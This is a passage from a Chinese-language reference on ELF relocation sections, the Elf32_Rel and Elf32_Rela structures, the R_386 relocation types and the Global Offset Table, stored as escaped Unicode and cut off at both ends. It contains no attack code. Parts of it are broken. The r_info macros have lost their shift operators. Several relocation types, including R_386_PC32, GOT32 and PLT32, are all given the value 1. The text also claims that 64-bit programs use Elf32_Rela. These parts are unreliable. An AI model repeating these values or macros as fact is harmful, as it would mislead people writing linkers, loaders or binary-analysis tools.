\u4e2d\u5c31\u4f1a\u5305\u542b\u4e00\u4e2a\u5177\u6709\u76f8\u5e94\u540d\u79f0\u7684\u52a8\u6001\u5b57\u7b26\u4e32\u8868\u7684\u7b26\u53f7\uff08Elf_Sym\uff09\uff0c\u5728 rel.dyn \u4e2d\u5c31\u4f1a\u5305\u542b\u4e00\u4e2a\u6307\u5411\u8fd9\u4e2a\u7b26\u53f7\u7684\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002\n\n\n.rel(a).dyn \n .rel(a).plt\n\n\n.rel.dyn \u5305\u542b\u4e86\u52a8\u6001\u94fe\u63a5\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u53d8\u91cf\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u5728\u52a0\u8f7d\u7684\u65f6\u5019\u5fc5\u987b\u5b8c\u5168\u786e\u5b9a\u3002\u800c .rel.plt \u5305\u542b\u4e86\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u51fd\u6570\u7684\u4fe1\u606f\u3002\u8fd9\u4e24\u7c7b\u91cd\u5b9a\u4f4d\u8282\u90fd\u4f7f\u7528\u5982\u4e0b\u7684\u7ed3\u6784\n\n\ntypedef struct {\n    Elf32_Addr        r_offset;\n    Elf32_Word       r_info;\n} Elf32_Rel;\n\ntypedef struct {\n    Elf32_Addr     r_offset;\n    Elf32_Word    r_info;\n    Elf32_Sword    r_addend;\n} Elf32_Rela;\n\n\n\n\nElf32_Rela \u7c7b\u578b\u7684\u8868\u9879\u5305\u542b\u660e\u786e\u7684\u8865\u9f50\u4fe1\u606f\u3002 Elf32_Rel \u7c7b\u578b\u7684\u8868\u9879\u5728\u5c06\u88ab\u4fee\u6539\u7684\u4f4d\u7f6e\u4fdd\u5b58\u9690\u5f0f\u7684\u8865\u9f50\u4fe1\u606f\u3002\u7531\u4e8e\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u7684\u539f\u56e0\uff0c\u8fd9\u4e24\u79cd\u5f62\u5f0f\u90fd\u5b58\u5728\uff0c\u751a\u81f3\u662f\u5fc5\u9700\u7684\u3002\u56e0\u6b64\uff0c\u5bf9\u7279\u5b9a\u673a\u5668\u7684\u5b9e\u73b0\u53ef\u4ee5\u4ec5\u4f7f\u7528\u4e00\u79cd\u5f62\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u6839\u636e\u4e0a\u4e0b\u6587\u4f7f\u7528\u4e24\u79cd\u5f62\u5f0f\u3002\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c32 \u4f4d\u7a0b\u5e8f\u53ea\u4f7f\u7528 Elf32_Rel\uff0c64 \u4f4d\u7a0b\u5e8f\u53ea\u4f7f\u7528 Elf32_Rela\u3002\n\n\n\u5176\u4e2d\uff0c\u6bcf\u4e2a\u5b57\u6bb5\u7684\u8bf4\u660e\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u6210\u5458\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nr_offset\n\n\n\u6b64\u6210\u5458\u7ed9\u51fa\u4e86\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u4f4d\u7f6e\u3002\n\u5bf9\u4e8e\u4e00\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u800c\u8a00\uff0c\u6b64\u503c\u662f\u4ece\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7\u6240\u5728\u8282\u533a\u5934\u90e8\u5f00\u59cb\u5230\u5c06\u88ab\u91cd\u5b9a\u4f4d\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u5b57\u8282\u504f\u79fb\u3002\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u800c\u8a00\uff0c\u5176\u53d6\u503c\u662f\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\n\u865a\u62df\u5730\u5740\n\uff0c\u4e00\u822c\u800c\u8a00\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u6240\u8bf4\u7684 GOT \u8868\u7684\u5730\u5740\u3002\n\n\n\n\n\n\nr_info\n\n\n\u6b64\u6210\u5458\u7ed9\u51fa\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7\u7684\u7b26\u53f7\u8868\u7d22\u5f15\uff0c\u4ee5\u53ca\u76f8\u5e94\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u3002\n  \u4f8b\u5982\u4e00\u4e2a\u8c03\u7528\u6307\u4ee4\u7684\u91cd\u5b9a\u4f4d\u9879\u5c06\u5305\u542b\u88ab\u8c03\u7528\u51fd\u6570\u7684\u7b26\u53f7\u8868\u7d22\u5f15\u3002\u5982\u679c\u7d22\u5f15\u662f STN_UNDEF\uff0c\u90a3\u4e48\u91cd\u5b9a\u4f4d\u4f7f\u7528 0 \u4f5c\u4e3a\u201c\u7b26\u53f7\u503c\u201d\u3002\u6b64\u5916\uff0c\u91cd\u5b9a\u4f4d\u7c7b\u578b\u662f\u548c\u5904\u7406\u5668\u76f8\u5173\u7684\u3002\n\n\n\n\n\n\nr_addend\n\n\n\u6b64\u6210\u5458\u7ed9\u51fa\u4e00\u4e2a\u5e38\u91cf\u8865\u9f50\uff0c\u7528\u6765\u8ba1\u7b97\u5c06\u88ab\u586b\u5145\u5230\u53ef\u91cd\u5b9a\u4f4d\u5b57\u6bb5\u7684\u6570\u503c\u3002\n\n\n\n\n\n\n\n\n\u5f53\u7a0b\u5e8f\u4ee3\u7801\u5f15\u7528\u4e00\u4e2a\u91cd\u5b9a\u4f4d\u9879\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u6216\u8005\u7b26\u53f7\u8868\u7d22\u5f15\u65f6\uff0c\u8fd9\u4e2a\u7d22\u5f15\u662f\u5bf9\u8868\u9879\u7684 r_info \u6210\u5458\u5e94\u7528 ELF32_R_TYPE \u6216\u8005 ELF32_R_SYM \u7684\u7ed3\u679c\u3002 \u4e5f\u5c31\u662f\u8bf4 r_info \u7684\u9ad8\u4e09\u4e2a\u5b57\u8282\u5bf9\u5e94\u7684\u503c\u8868\u793a\u8fd9\u4e2a\u52a8\u6001\u7b26\u53f7\u5728.dynsym\u7b26\u53f7\u8868\u4e2d\u7684\u4f4d\u7f6e\u3002\n\n\n#define ELF32_R_SYM(i)    ((i)\n8)\n\n\n#define ELF32_R_TYPE(i)   ((unsigned char)(i))\n\n\n#define ELF32_R_INFO(s,t) (((s)\n8)+(unsigned char)(t))\n\n\n\n\n\n\u91cd\u5b9a\u4f4d\u8282\u533a\u4f1a\u5f15\u7528\u4e24\u4e2a\u5176\u5b83\u8282\u533a\uff1a\n\u7b26\u53f7\u8868\u3001\u8981\u4fee\u6539\u7684\u8282\u533a\n\u3002\u8282\u533a\u5934\u90e8\u7684 sh_info \u548c sh_link \u6210\u5458\u7ed9\u51fa\u76f8\u5e94\u7684\u5173\u7cfb\u3002\n\n\n\u91cd\u5b9a\u4f4d\u7c7b\u578b\n\n\n\u91cd\u5b9a\u4f4d\u8868\u9879\u63cf\u8ff0\u4e86\u5982\u4f55\u4fee\u6539\u76f8\u5173\u7684\u6307\u4ee4\u4e0e\u6570\u636e\u57df\uff0c\u5176\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u5982\u4e0b\n\n\n\n\n\u5176\u4e2d\uff0cword32 \u6307\u5b9a\u4e86\u4e00\u4e2a 32 \u6bd4\u7279\u7684\u53d8\u91cf\uff0c\u5360\u7528 4 \u4e2a\u5b57\u8282\uff0c\u5bf9\u9f50\u65b9\u5f0f\u4efb\u610f\u3002\u8fd9\u4e9b\u503c\u4f7f\u7528\u548c Intel \u67b6\u6784\u4e2d\u5176\u5b83\u5b57\u7c7b\u4f3c\u7684\u5b57\u8282\u5e8f\uff0c\u4e00\u822c\u90fd\u662f\u5c0f\u7aef\u5e8f\u3002\n\n\n\n\n\u5728\u4e0b\u9762\u7684\u8ba1\u7b97\u4e2d\uff0c\u6211\u4eec\u5047\u8bbe\u662f\u628a\u4e00\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u8f6c\u6362\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002\u4ece\u6982\u5ff5\u4e0a\u8bb2\uff0c\u94fe\u63a5\u5668\u4f1a\u628a\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u5408\u5e76\u8d77\u6765\u5f97\u5230\u8f93\u51fa\u6587\u4ef6\u3002\u5b83\u9996\u5148\u8981\u51b3\u5b9a\u5982\u4f55\u7ed3\u5408\u5e76\u653e\u7f6e\u8fd9\u4e9b\u8f93\u5165\u6587\u4ef6\uff0c\u7136\u540e\u66f4\u65b0\u7b26\u53f7\u8868\u7684\u503c\uff0c\u6700\u540e\u624d\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u91cd\u5b9a\u4f4d\u65b9\u6cd5\u662f\u76f8\u4f3c\u7684\uff0c\u5e76\u4e14\u7ed3\u679c\u51e0\u4e4e\u4e00\u6837\u3002\u5728\u540e\u9762\u7684\u63cf\u8ff0\u4e2d\u6211\u4eec\u5c06\u4f1a\u91c7\u7528\u5982\u4e0b\u8bb0\u53f7\u3002\n\n\n\n\nA(addend) \u7528\u6765\u8ba1\u7b97\u53ef\u91cd\u5b9a\u4f4d\u5b57\u6bb5\u7684\u53d6\u503c\u7684\u8865\u9f50\u3002\n\n\nB(base)  \u8868\u793a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u865a\u62df\u57fa\u5730\u5740\u4e3a0\uff0c\u4f46\u662f\u5728\u6267\u884c\u65f6\uff0c\u5176\u5730\u5740\u5374\u4f1a\u53d1\u751f\u6539\u53d8\u3002\n\n\nG(Global) \u8868\u793a\u5728\u6267\u884c\u65f6\u91cd\u5b9a\u4f4d\u9879\u7684\u7b26\u53f7\u5728\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u7684\u504f\u79fb\u3002\n\n\nGOT (global offset table) \u8868\u793a\u5168\u5c40\u504f\u79fb\u8868\uff08GOT\uff09\u7684\u5730\u5740\u3002\n\n\nL (linkage) \u8868\u793a\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u4e2d\u4e00\u4e2a\u7b26\u53f7\u7684\u8282\u533a\u504f\u79fb\u6216\u8005\u5730\u5740\u3002\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u4f1a\u628a\u51fd\u6570\u8c03\u7528\u91cd\u5b9a\u4f4d\u5230\u6b63\u786e\u7684\u76ee\u6807\u4f4d\u7f6e\u3002\u94fe\u63a5\u7f16\u8f91\u5668\u4f1a\u6784\u9020\u521d\u59cb\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\uff0c\u7136\u540e\u52a8\u6001\u94fe\u63a5\u5668\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u4fee\u6539\u8fd9\u4e9b\u9879\u76ee\u3002\n\n\nP (place) \u8868\u793a\u88ab\u91cd\u5b9a\u4f4d\uff08\u7528 r_offset \u8ba1\u7b97\uff09\u7684\u5b58\u50a8\u5355\u5143\u7684\u4f4d\u7f6e\uff08\u8282\u533a\u504f\u79fb\u6216\u8005\u5730\u5740\uff09\u3002\n\n\nS  (symbol) \u8868\u793a\u7d22\u5f15\u4f4d\u4e8e\u91cd\u5b9a\u4f4d\u9879\u4e2d\u7684\u7b26\u53f7\u7684\u53d6\u503c\u3002\n\n\n\n\n\u91cd\u5b9a\u4f4d\u9879\u7684 r_offset \u53d6\u503c\u4e3a\u53d7\u5f71\u54cd\u7684\u5b58\u50a8\u5355\u5143\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u6216\u8005\u865a\u62df\u5730\u5740\u3002\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7ed9\u51fa\u9700\u8981\u4fee\u6539\u7684\u6bd4\u7279\u4f4d\u4ee5\u53ca\u5982\u4f55\u8ba1\u7b97\u5b83\u4eec\u7684\u503c\u3002\u5176\u4e2d\uff0cIntel \u67b6\u6784\u53ea\u4f7f\u7528 ELF32_REL \u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u5c06\u8981\u88ab\u91cd\u5b9a\u4f4d\u7684\u6210\u5458\u4fdd\u7559\u5bf9\u5e94\u7684\u8865\u9f50\u6570\u503c\u3002\u5728\u6240\u6709\u7684\u60c5\u51b5\u4e0b\uff0c\u8865\u9f50\u7684\u6570\u503c\u4e0e\u8ba1\u7b97\u7684\u7ed3\u679c\u4f7f\u7528\u76f8\u540c\u7684\u5b57\u8282\u5e8f\u3002\n\n\n\u91cd\u5b9a\u4f4d\u7c7b\u578b\u4ee5\u53ca\u90e8\u5206\u542b\u4e49\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u503c\n\n\n\u57df\n\n\n\u8ba1\u7b97\n\n\n\u542b\u4e49\n\n\n\n\n\n\n\n\n\n\nR_386_NONE\n\n\n0\n\n\n\u65e0\n\n\n\u65e0\n\n\n\n\n\n\n\n\nR_386_32\n\n\n1\n\n\nword32\n\n\nS + A\n\n\n\n\n\n\n\n\nR_386_PC32\n\n\n1\n\n\nword32\n\n\nS + A - P\n\n\n\n\n\n\n\n\nR_386_GOT32\n\n\n1\n\n\nword32\n\n\nG + A - P\n\n\n\u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u4ece\u5168\u5c40\u504f\u79fb\u8868\u57fa\u5740\u5230\u7b26\u53f7\u7684\u5168\u5c40\u504f\u79fb\u8868\u9879\u7684\u8ddd\u79bb\u3002\u53e6\u5916\uff0c\u5b83\u8fd8\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002\n\n\n\n\n\n\nR_386_PLT32\n\n\n1\n\n\nword32\n\n\nL + A - P\n\n\n\u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u7b26\u53f7\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u5730\u5740\u3002\u53e6\u5916\uff0c\u5b83\u8fd8\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u8fc7\u7a0b\u94fe\u63a5\u8868\u3002\n\n\n\n\n\n\nR_386_COPY\n\n\n5\n\n\n\u65e0\n\n\n\u65e0\n\n\n\u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u6307\u5411\u53ef\u5199\u6bb5\u4e2d\u7684\u4f4d\u7f6e\u3002\u7b26\u53f7\u8868\u89c4\u5b9a\u8fd9\u79cd\u7b26\u53f7\u5e94\u65e2\u5b58\u5728\u4e8e\u5f53\u524d\u76ee\u6807\u6587\u4ef6\u53c8\u8be5\u5b58\u5728\u4e8e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u3002\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4e0e\u8be5\u5171\u4eab\u76ee\u6807\u7b26\u53f7\u76f8\u5173\u7684\u6570\u636e\u590d\u5236\u5230\u7531\u4e0a\u8ff0\u504f\u79fb\u91cf\u6307\u5b9a\u7684\u4f4d\u7f6e\u3002\n\n\n\n\n\n\nR_386_GLOB_DAT\n\n\n6\n\n\nword32\n\n\nS\n\n\n\u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7528\u4e8e\u628a\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u7684\u7b26\u53f7\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7b26\u53f7\u7684\u5730\u5740\u3002\u8fd9\u4e2a\u7279\u6b8a\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u5141\u8bb8\u786e\u5b9a\u7b26\u53f7\u548c\u5168\u5c40\u504f\u79fb\u8868\u9879\u4e4b\u95f4\u7684\u5173\u7cfb\u3002\n\n\n\n\n\n\nR_386_JMP_SLOT\n\n\n7\n\n\nword32\n\n\nS\n\n\n\u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u7ed9\u51fa\u4e86\u76f8\u5e94\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u7684\u4f4d\u7f6e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4fee\u6539\u8fc7\u7a0b\u94fe\u63a5\u8868\uff0c\u4ece\u800c\u628a\u7a0b\u5e8f\u63a7\u5236\u6743\u8f6c\u79fb\u5230\u4e0a\u8ff0\u6307\u51fa\u7684\u7b26\u53f7\u5730\u5740\u3002\n\n\n\n\n\n\nR_386_RELATIVE\n\n\n8\n\n\nword32\n\n\nB + A\n\n\n\u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u7ed9\u51fa\u4e86\u5171\u4eab\u76ee\u6807\u4e2d\u7684\u4e00\u4e2a\u5305\u542b\u4e86\u67d0\u4e2a\u4ee3\u8868\u76f8\u5bf9\u5730\u5740\u7684\u503c\u7684\u4f4d\u7f6e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u901a\u8fc7\u628a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u88c5\u8f7d\u5230\u7684\u865a\u62df\u5730\u5740\u4e0e\u4e0a\u8ff0\u76f8\u5bf9\u5730\u5740\u76f8\u52a0\u6765\u8ba1\u7b97\u5bf9\u5e94\u865a\u62df\u5730\u5740\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u91cd\u5b9a\u4f4d\u9879\u8bbe\u7f6e\u7b26\u53f7\u8868\u7d22\u5f15\u4e3a0\u3002\n\n\n\n\n\n\nR_386_GOTOFF\n\n\n9\n\n\nword32\n\n\nS + A - GOT\n\n\n\u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u7b26\u53f7\u503c\u4e0e\u5168\u5c40\u504f\u79fb\u8868\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u901a\u77e5\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002\n\n\n\n\n\n\nR_386_GOTPC\n\n\n10\n\n\nword32\n\n\nS + A - P\n\n\n\u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u4e0e\nR_386_PC32\n \u7c7b\u4f3c\uff0c\u53ea\u4e0d\u8fc7\u5b83\u5728\u8ba1\u7b97\u65f6\u4f7f\u7528\u5168\u5c40\u504f\u79fb\u8868\u7684\u5730\u5740\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8be5\u91cd\u5b9a\u4f4d\u8868\u9879\u4e2d\u88ab\u5f15\u7528\u7684\u7b26\u53f7\u662f\n_GLOBAL_OFFSET_TABLE_\n \uff0c\u5b83\u4f1a\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002\n\n\n\n\n\n\n\n\nGlobal Offset Table\n\n\nGOT \u8868\u5728 ELF \u6587\u4ef6\u4e2d\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\n\n\n\n\n.got\uff0c\u5b58\u50a8\u5168\u5c40\u53d8\u91cf\u7684\u5f15\u7528\u3002\n\n\n.got.plt\uff0c\u5b58\u50a8\u51fd\u6570\u7684\u5f15\u7528\u3002\n\n\n\n\n\u5176\u76f8\u5e94\u7684\u503c\u7531\u80fd\u591f\u89e3\u6790.rel.plt \u6bb5\u4e2d\u7684\u91cd\u5b9a\u4f4d\u7684\u52a8\u6001\u94fe\u63a5\u5668\u6765\u586b\u5199\u3002\n\n\n\u901a\u5e38\u6765\u8bf4\uff0c\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u4e0d\u80fd\u5305\u542b\u7edd\u5bf9\u865a\u62df\u5730\u5740\u3002GOT\u8868\u4e2d\u5305\u542b\u4e86\u9690\u85cf\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u8fd9\u4f7f\u5f97\u5728\u4e0d\u8fdd\u80cc\u4f4d\u7f6e\u65e0\u5173\u6027\u4ee5\u53ca\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u517c\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5f97\u5230\u76f8\u5173\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u3002\u4e00\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u4f4d\u7f6e\u72ec\u7acb\u4ee3\u7801\u6765\u5f15\u7528\u5b83\u7684GOT\u8868\uff0c\u7136\u540e\u63d0\u53d6\u51fa\u6765\u7edd\u5bf9\u7684\u6570\u503c\uff0c\u4ee5\u4fbf\u4e8e\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u5f15\u7528\u91cd\u5b9a\u5411\u5230\u7edd\u5bf9\u7684\u5730\u5740\u3002 \u8fd9\u4e2a\u8868\u5bf9\u4e8e System V \u73af\u5883\u4e2d\u7684\u52a8\u6001\u94fe\u63a5\u6765\u8bf4\u662f\u5fc5\u8981\u7684\uff0c\u4f46\u5176\u5177\u4f53\u7684\u5185\u5bb9\u4ee5\u53ca\u5f62\u5f0f\u4f9d\u8d56\u4e8e\u5904\u7406\u5668\u3002\n\n\n\u521d\u59cb\u65f6\uff0cgot \u8868\u4e2d\u5305\u542b\u91cd\u5b9a\u5411\u5165\u53e3\u6240\u9700\u8981\u7684\u4fe1\u606f\u3002\u5f53\u4e00\u4e2a\u7cfb\u7edf\u4e3a\u53ef\u52a0\u8f7d\u7684\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u5185\u5b58\u6bb5\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5904\u7406\u91cd\u5b9a\u4f4d\u9879\uff0c\u5176\u4e2d\u7684\u4e00\u4e9b\u9879\u7684\u7c7b\u578b\u53ef\u80fd\u662f R_386_GLOB_DAT\uff0c\u8fd9\u4f1a\u6307\u5411 got \u8868\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u51b3\u5b9a\u76f8\u5173\u7684\u7b26\u53f7\u7684\u503c\uff0c\u8ba1\u7b97\u5b83\u4eec\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u7136\u540e\u5c06\u5408\u9002\u7684\u5185\u5b58\u8868\u9879\u8bbe\u7f6e\u4e3a\u76f8\u5e94\u7684\u503c\u3002\u5c3d\u7ba1\u5728\u94fe\u63a5\u5668\u5efa\u7acb\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u7edd\u5bf9\u5730\u5740\u8fd8\u5904\u4e8e\u672a\u77e5\u72b6\u6001\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u77e5\u9053\u6240\u6709\u5185\u5b58\u6bb5\u7684\u5730\u5740\uff0c\u56e0\u4e3a\u53ef\u4ee5\u8ba1\u7b97\u6240\u5305\u542b\u7684\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u3002\n\n\n\u5982\u679c\u4e00\u4e2a\u7a0b\u5e8f\u9700\u8981\u76f4\u63a5\u8bbf\u95ee\u4e00\u4e2a\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7b26\u53f7\u5c06\u4f1a\u6709\u4e00\u4e2a got \u8868\u9879\u3002\u7531\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u5355\u72ec\u7684\u8868\u9879\uff0c\u6240\u4ee5\u4e00\u4e2a\u7b26\u53f7\u7684\u5730\u5740\u53ef\u80fd\u4f1a\u51fa\u73b0\u5728\u591a\u4e2a\u8868\u4e2d\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5728\u628a\u6743\u9650\u7ed9\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u4ee3\u7801\u6bb5\u524d\uff0c\u4f1a\u5904\u7406\u6240\u6709\u7684 got \u8868\u4e2d\u7684\u91cd\u5b9a\u4f4d\u9879\uff0c\u4ee5\u4fbf\u4e8e\u786e\u5b9a\u6240\u6709\u7684\u7edd\u5bf9\u5730\u5740\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u3002\n\n\nGOT \u8868\u4e2d\u7684\u7b2c 0 \u9879\u5305\u542b\u52a8\u6001\u7ed3\u6784\u7684\u5730\u5740\uff0c\u7528\u7b26\u53f7 _DYNAMIC \u6765\u8fdb\u884c\u5f15\u7528\u3002\u8fd9\u4f7f\u5f97\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u4f8b\u5982\u52a8\u6001\u94fe\u63a5\u5668\uff0c\u5728\u6ca1\u6709\u6267\u884c\u5176\u91cd\u5b9a\u5411\u524d\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684\u52a8\u6001\u7ed3\u6784\u3002\u8fd9\u5bf9\u4e8e\u52a8\u6001\u94fe\u63a5\u5668\u6765\u8bf4\u662f\u975e\u5e38\u91cd\u8981\u7684\uff0c\u56e0\u4e3a\u5b83\u5fc5\u987b\u5728\u4e0d\u4f9d\u8d56\u5176\u5b83\u7a0b\u5e8f\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u91cd\u5b9a\u4f4d\u81ea\u5df1\u7684\u5185\u5b58\u955c\u50cf\u3002\n\n\n\u5728\u4e0d\u540c\u7684\u7a0b\u5e8f\u4e2d\uff0c\u7cfb\u7edf\u53ef\u80fd\u4f1a\u4e3a\u540c\u4e00\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u9009\u62e9\u4e0d\u540c\u7684\u5185\u5b58\u6bb5\u5730\u5740\uff1b\u751a\u81f3\u5bf9\u4e8e\u540c\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5728\u4e0d\u540c\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u5e93\u5730\u5740\u3002\u7136\u800c\uff0c\u4e00\u65e6\u8fdb\u7a0b\u955c\u50cf\u88ab\u5efa\u7acb\uff0c\u5185\u5b58\u6bb5\u7684\u5730\u5740\u5c31\u4e0d\u4f1a\u518d\u6539\u53d8\uff0c\u53ea\u8981\u4e00\u4e2a\u8fdb\u7a0b\u8fd8\u5b58\u5728\uff0c\u5b83\u7684\u5185\u5b58\u6bb5\u5730\u5740\u5c06\u5904\u4e8e\u56fa\u5b9a\u7684\u4f4d\u7f6e\u3002\n\n\nGOT \u8868\u7684\u5f62\u5f0f\u4ee5\u53ca\u89e3\u91ca\u4f9d\u8d56\u4e8e\u5177\u4f53\u7684\u5904\u7406\u5668\uff0c\u5bf9\u4e8e Intel \u67b6\u6784\u6765\u8bf4\uff0c\n_GLOBAL_OFFSET_TABLE_\n \u7b26\u53f7\u53ef\u80fd\u88ab\u7528\u6765\u8bbf\u95ee\u8fd9\u4e2a\u8868\u3002\n\n\nextern Elf32_Addr _GLOBAL_OFFSET_TABLE[];\n\n\n\n\nGLOBAL_OFFSET_TABLE\n \u53ef\u80fd\u4f1a\u5728 .got \u8282\u7684\u4e2d\u95f4\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u4f7f\u7528\u6b63\u8d1f\u7d22\u5f15\u6765\u8bbf\u95ee\u8fd9\u4e2a\u8868\u3002\n\n\n\u5728 Linux \u7684\u5b9e\u73b0\u4e2d\uff0c.got.plt \u7684\u524d\u4e09\u9879\u7684\u5177\u4f53\u7684\u542b\u4e49\u5982\u4e0b\n\n\n\n\nGOT[0]\uff0c.dynamic \u7684\u5730\u5740\u3002\n\n\nGOT[1]\uff0c\u6307\u5411\u5185\u90e8\u7c7b\u578b\u4e3a link_map \u7684\u6307\u9488\uff0c\u53ea\u4f1a\u5728\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d\u4f7f\u7528\uff0c\u5305\u542b\u4e86\u8fdb\u884c\u7b26\u53f7\u89e3\u6790\u9700\u8981\u7684\u5f53\u524d ELF\u5bf9\u8c61\u7684\u4fe1\u606f\u3002\u6bcf\u4e2a link_map \u90fd\u662f\u4e00\u6761\u53cc\u5411\u94fe\u8868\u7684\u4e00\u4e2a\u8282\u70b9\uff0c\u800c\u8fd9\u4e2a\u94fe\u8868\u4fdd\u5b58\u4e86\u6240\u6709\u52a0\u8f7d\u7684 ELF 